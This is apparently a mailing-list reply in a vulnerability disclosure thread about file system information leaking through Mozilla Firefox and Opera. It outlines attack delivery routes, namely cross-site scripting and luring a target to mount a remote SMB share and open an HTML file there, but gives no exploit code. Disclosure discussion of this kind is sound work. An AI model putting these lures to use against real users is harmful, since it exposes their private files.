Subject: Re: Disclosure of file system information in Mozilla Firefox and
 Opera Browser:


Target user doesn't need to click the OPEN button:
1. Cross-site scripting vulnerabilities can get it done(on Mozilla, an 
internet page can't navigate to a local page directly ... but there are 
ways to bypass this restriction).
2. Ask target to open an HTML file in a remote SMBFS folder - expecting 
him to
mount -t smbfs [...] /mnt/[...]
and open "/mnt/[...].html" in Mozilla :-)

Attacker can *browse* target's folders and files(file content, filename, 
filesize, and even the date).
